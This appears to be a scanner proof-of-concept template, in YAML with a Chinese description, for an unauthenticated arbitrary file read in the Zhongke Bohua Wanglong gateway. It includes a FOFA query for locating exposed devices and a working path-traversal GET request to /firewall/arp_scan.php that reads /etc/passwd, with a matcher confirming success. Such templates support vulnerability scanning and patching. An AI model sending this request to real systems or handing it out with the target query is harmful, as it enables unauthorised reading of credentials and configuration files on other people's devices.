id: bohuawanglong-arp-scan-fileread
info:
  name: 中科博华网龙网关 arp_scan.php 任意文件读取漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: title="博华网龙"
    中科博华网龙网关 arp_scan.php 任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - https://mp.weixin.qq.com/s/1GaVAZLcHXVRLUPCdPnBVw
  tags: bohuawanglong,fileread

rules:
  r0:
    request:
      method: GET
      path: /firewall/arp_scan.php?ifname=/../../../../../etc/passwd
    expression: response.status == 200 && response.body.bcontains(b'sshd:x') && response.body.bcontains(b'/sbin/nologin')
expression: r0()
